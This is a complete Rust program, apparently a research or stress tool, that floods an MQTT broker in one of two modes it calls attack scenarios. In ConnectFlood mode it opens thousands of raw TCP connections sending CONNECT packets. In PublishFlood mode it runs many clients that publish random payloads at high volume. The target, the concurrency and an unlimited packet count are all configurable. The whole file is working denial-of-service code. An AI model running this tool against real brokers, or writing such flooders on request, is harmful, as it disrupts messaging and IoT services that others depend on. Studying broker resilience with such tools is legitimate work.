use bytes::BytesMut;
use clap::Parser;
use mqttbytes::{Protocol, v4, v5};
use rand::{
    Rng, SeedableRng,
    distr::{Alphanumeric, StandardUniform},
    rngs::SmallRng,
};
use rumqttc::{AsyncClient, MqttOptions, QoS};
use std::{
    cmp::{max, min},
    fmt,
    str::FromStr,
    sync::Arc,
};
use tokio::{
    io::{self, AsyncWriteExt},
    net::TcpStream,
    sync::{OwnedSemaphorePermit, Semaphore},
    task::{self, JoinHandle},
    time::{Duration, sleep},
};

#[derive(Debug, Clone, Copy)]
enum AttackScenario {
    ConnectFlood,
    PublishFlood,
}

impl fmt::Display for AttackScenario {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            AttackScenario::ConnectFlood => write!(f, "ConnectFlood"),
            AttackScenario::PublishFlood => write!(f, "PublishFlood"),
        }
    }
}

impl FromStr for AttackScenario {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "connect_flood" | "ConnectFlood" => Ok(AttackScenario::ConnectFlood),
            "publish_flood" | "PublishFlood" => Ok(AttackScenario::PublishFlood),
            other => Err(format!(
                "invalid attack scenario: {other} (use connect_flood or publish_flood)"
            )),
        }
    }
}

#[derive(Debug, Clone, Copy)]
enum ProtocolVersion {
    V4,
    V5,
}

impl fmt::Display for ProtocolVersion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ProtocolVersion::V4 => write!(f, "4"),
            ProtocolVersion::V5 => write!(f, "5"),
        }
    }
}

impl FromStr for ProtocolVersion {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "4" | "v4" | "V4" => Ok(ProtocolVersion::V4),
            "5" | "v5" | "V5" => Ok(ProtocolVersion::V5),
            other => Err(format!("invalid protocol version: {other} (use 4 or 5)")),
        }
    }
}

#[derive(Debug, Clone, Copy)]
enum QoSLevel {
    AtLeastOnce,
    AtMostOnce,
    ExactlyOnce,
}

impl fmt::Display for QoSLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            QoSLevel::AtLeastOnce => write!(f, "AtLeastOnce"),
            QoSLevel::AtMostOnce => write!(f, "AtMostOnce"),
            QoSLevel::ExactlyOnce => write!(f, "ExactlyOnce"),
        }
    }
}

impl FromStr for QoSLevel {
    type Err = String;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "0" | "AtMostOnce" | "at_most_once" => Ok(QoSLevel::AtMostOnce),
            "1" | "AtLeastOnce" | "at_least_once" => Ok(QoSLevel::AtLeastOnce),
            "2" | "ExactlyOnce" | "exactly_once" => Ok(QoSLevel::ExactlyOnce),
            other => Err(format!("invalid QoS level: {other} (use 0, 1, or 2)")),
        }
    }
}

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Username for MQTT connection
    #[arg(short, long, default_value = None)]
    username: Option<String>,

    /// Password for MQTT connection
    #[arg(short, long, default_value = None)]
    password: Option<String>,

    /// Broker hostname
    #[arg(short, long, default_value = "localhost")]
    broker_hostname: String,

    /// Port of the MQTT broker
    #[arg(short, long, default_value_t = 1883)]
    port: u16,

    /// Number of simultaneous connections
    #[arg(short, long, default_value_t = 1000)]
    simultaneous_connections: usize,

    /// Total number of packets (0 for infinite)
    #[arg(short, long, default_value_t = 10000)]
    total_packets: usize,

    /// Delay between spawning connections in milliseconds
    #[arg(short, long, default_value_t = 0)]
    spawn_delay: u64,

    /// Delay between sending packets in milliseconds
    #[arg(short, long, default_value_t = 0)]
    send_delay: u64,

    /// MQTT protocol version
    #[arg(short, long, default_value_t = ProtocolVersion::V4)]
    protocol_version: ProtocolVersion,

    /// Quality of Service level
    #[arg(short, long, default_value_t = QoSLevel::AtLeastOnce)]
    qos_level: QoSLevel,

    /// Payload size in bytes
    #[arg(short, long, default_value_t = 1000)]
    payload_size: usize,

    /// Attack scenario
    #[arg(short, long, default_value_t = AttackScenario::ConnectFlood)]
    attack_scenario: AttackScenario,
}

const CLIENT_ID_LENGTH: usize = 16;
const KEEP_ALIVE: u16 = 60;
const CLEAN_SESSION: bool = false;
const LAST_WILL_V4: Option<v4::LastWill> = None;
const LAST_WILL_V5: Option<v5::LastWill> = None;
const CONNECT_PROPERTIES_V5: Option<v5::ConnectProperties> = None;
const RETAIN: bool = false;

fn get_client_id(rng: &mut SmallRng) -> String {
    rng.sample_iter(&Alphanumeric)
        .take(CLIENT_ID_LENGTH)
        .map(char::from)
        .collect()
}

fn get_topic(rng: &mut SmallRng) -> String {
    let parent_topic: String = rng
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    let child_topic: String = rng
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();
    format!("{}/{}", parent_topic, child_topic)
}

fn get_payload(rng: &mut SmallRng, size: usize) -> Vec<u8> {
    rng.sample_iter(StandardUniform).take(size).collect()
}

fn get_login_v4(username: &str, password: &str) -> v4::Login {
    v4::Login {
        username: username.into(),
        password: password.into(),
    }
}

fn get_login_v5(username: &str, password: &str) -> v5::Login {
    v5::Login {
        username: username.into(),
        password: password.into(),
    }
}

fn get_connect_v4(client_id: &str, login: Option<v4::Login>) -> v4::Connect {
    v4::Connect {
        protocol: Protocol::V4,
        keep_alive: KEEP_ALIVE,
        client_id: client_id.into(),
        clean_session: CLEAN_SESSION,
        last_will: LAST_WILL_V4,
        login: login,
    }
}

fn get_connect_v5(client_id: &str, login: Option<v5::Login>) -> v5::Connect {
    v5::Connect {
        protocol: Protocol::V5,
        keep_alive: KEEP_ALIVE,
        client_id: client_id.into(),
        clean_session: CLEAN_SESSION,
        last_will: LAST_WILL_V5,
        login: login,
        properties: CONNECT_PROPERTIES_V5,
    }
}

fn spawn_connect(
    semaphore_arc: Arc<Semaphore>,
    username: Option<String>,
    password: Option<String>,
    broker_addr: String,
    protocol_version: ProtocolVersion,
) -> JoinHandle<()> {
    let mut rng = SmallRng::from_os_rng();
    let client_id = get_client_id(&mut rng);
    let protocol_version = protocol_version;
    let handle = tokio::spawn(async move {
        let permit = semaphore_arc
            .acquire_owned()
            .await
            .expect("Failed to acquire semaphore permit");
        println!("Starting client {}", client_id);
        send_connect(
            &client_id,
            username.as_deref(),
            password.as_deref(),
            &broker_addr,
            protocol_version,
            permit,
        )
        .await;
    });
    handle
}

fn spawn_publish(
    username: Option<&str>,
    password: Option<&str>,
    broker_hostname: &str,
    port: u16,
    qos_level: QoS,
    packets_per_client: usize,
    payload_size: usize,
    send_delay: u64,
) -> (JoinHandle<()>, JoinHandle<()>) {
    let mut rng = SmallRng::from_os_rng();
    let client_id = get_client_id(&mut rng);
    let mut mqttoptions = MqttOptions::new(client_id.clone(), broker_hostname, port);
    mqttoptions.set_keep_alive(core::time::Duration::from_secs(KEEP_ALIVE as u64));
    mqttoptions.set_clean_session(CLEAN_SESSION);
    if let (Some(username), Some(password)) = (username, password) {
        mqttoptions.set_credentials(username, password);
    }
    if packets_per_client == 0 {
        mqttoptions.set_request_channel_capacity(u16::MAX as usize);
        mqttoptions.set_inflight(u16::MAX);
    } else {
        mqttoptions.set_request_channel_capacity(packets_per_client);
        mqttoptions.set_inflight(min(u16::MAX as usize, packets_per_client) as u16);
    }
    let (client, mut eventloop) = AsyncClient::new(mqttoptions, packets_per_client);
    let publisher_handle = task::spawn(async move {
        let mut rng = SmallRng::from_os_rng();
        let topic = get_topic(&mut rng);
        if packets_per_client == 0 {
            loop {
                let payload = get_payload(&mut rng, payload_size);
                if let Err(e) = client
                    .publish(topic.clone(), qos_level, RETAIN, payload)
                    .await
                {
                    eprintln!("Failed to publish message: {}", e);
                }
                if send_delay > 0 {
                    sleep(Duration::from_millis(send_delay)).await;
                }
            }
        } else {
            for _ in 0..packets_per_client {
                let payload = get_payload(&mut rng, payload_size);
                if let Err(e) = client
                    .publish(topic.clone(), qos_level, RETAIN, payload)
                    .await
                {
                    eprintln!("Failed to publish message: {}", e);
                }
                if let Err(e) = client.disconnect().await {
                    eprintln!("Failed to send disconnect: {}", e);
                }
                if send_delay > 0 {
                    sleep(Duration::from_millis(send_delay)).await;
                }
            }
        }
    });
    let event_loop_handle = task::spawn(async move {
        let client_id = client_id.clone();
        loop {
            let event = match eventloop.poll().await {
                Ok(event) => {
                    if let rumqttc::Event::Incoming(rumqttc::Packet::Disconnect) = event {
                        println!(
                            "Client {} received disconnect, exiting event loop",
                            client_id
                        );
                        break;
                    }
                    event
                }
                Err(e) => {
                    eprintln!("Error in event loop: {}", e);
                    break;
                }
            };
            println!("Received event: {:?}", event);
        }
    });
    (publisher_handle, event_loop_handle)
}

async fn send_connect(
    client_id: &str,
    username: Option<&str>,
    password: Option<&str>,
    broker_addr: &str,
    protocol_version: ProtocolVersion,
    _permit: OwnedSemaphorePermit,
) -> () {
    let mut buf = BytesMut::new();

    match protocol_version {
        ProtocolVersion::V4 => {
            let login = match (username, password) {
                (Some(u), Some(p)) => Some(get_login_v4(u, p)),
                _ => None,
            };
            let connect = get_connect_v4(client_id, login);
            if let Err(e) = connect.write(&mut buf) {
                eprintln!("Failed to serialize CONNECT packet: {}", e);
                return;
            }
        }
        ProtocolVersion::V5 => {
            let login = match (username, password) {
                (Some(u), Some(p)) => Some(get_login_v5(u, p)),
                _ => None,
            };
            let connect = get_connect_v5(client_id, login);
            if let Err(e) = connect.write(&mut buf) {
                eprintln!("Failed to serialize CONNECT packet: {}", e);
                return;
            }
        }
    }

    let mut stream = match TcpStream::connect(broker_addr).await {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Failed to connect to broker: {}", e);
            return;
        }
    };
    if let Err(e) = AsyncWriteExt::write_all(&mut stream, &buf).await {
        eprintln!("Failed to send CONNECT packet: {}", e);
        return;
    }
    if let Err(e) = stream.shutdown().await {
        eprintln!("Failed to shutdown connection: {}", e);
        return;
    }
}

#[tokio::main(flavor = "multi_thread")]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    let broker_addr = format!("{}:{}", args.broker_hostname, args.port);
    let mut handles = vec![];

    match args.attack_scenario {
        AttackScenario::ConnectFlood => {
            println!(
                "Starting Connect Flood attack against {} using MQTT v{} with {} simultaneous connections, sending a total of {} CONNECT packets",
                broker_addr,
                args.protocol_version,
                args.simultaneous_connections,
                args.total_packets
            );

            let semaphore = Arc::new(Semaphore::new(args.simultaneous_connections));
            if args.total_packets == 0 {
                loop {
                    let handle = spawn_connect(
                        semaphore.clone(),
                        args.username.clone(),
                        args.password.clone(),
                        broker_addr.clone(),
                        args.protocol_version,
                    );
                    handles.push(handle);
                    if args.spawn_delay > 0 {
                        sleep(Duration::from_millis(args.spawn_delay)).await;
                    }
                }
            } else {
                for _ in 0..args.total_packets {
                    let handle = spawn_connect(
                        semaphore.clone(),
                        args.username.clone(),
                        args.password.clone(),
                        broker_addr.clone(),
                        args.protocol_version,
                    );
                    handles.push(handle);
                    if args.spawn_delay > 0 {
                        sleep(Duration::from_millis(args.spawn_delay)).await;
                    }
                }
            }
        }
        AttackScenario::PublishFlood => {
            println!(
                "Starting Publish Flood attack against {} using MQTT v{} with {} simultaneous connections, sending a total of {} PUBLISH packets",
                broker_addr,
                args.protocol_version,
                args.simultaneous_connections,
                args.total_packets
            );

            for _ in 0..args.simultaneous_connections {
                let packets_per_client = args.total_packets / max(args.simultaneous_connections, 1);
                let qos_level = match args.qos_level {
                    QoSLevel::AtMostOnce => QoS::AtMostOnce,
                    QoSLevel::AtLeastOnce => QoS::AtLeastOnce,
                    QoSLevel::ExactlyOnce => QoS::ExactlyOnce,
                };
                let (publisher_handle, event_loop_handle) = spawn_publish(
                    args.username.as_deref(),
                    args.password.as_deref(),
                    &args.broker_hostname,
                    args.port,
                    qos_level,
                    packets_per_client,
                    args.payload_size,
                    args.send_delay,
                );
                handles.push(publisher_handle);
                handles.push(event_loop_handle);

                if args.spawn_delay > 0 {
                    sleep(Duration::from_millis(args.spawn_delay)).await;
                }
            }
        }
    }

    for handle in handles {
        handle.await.expect("Task panicked");
    }

    Ok(())
}
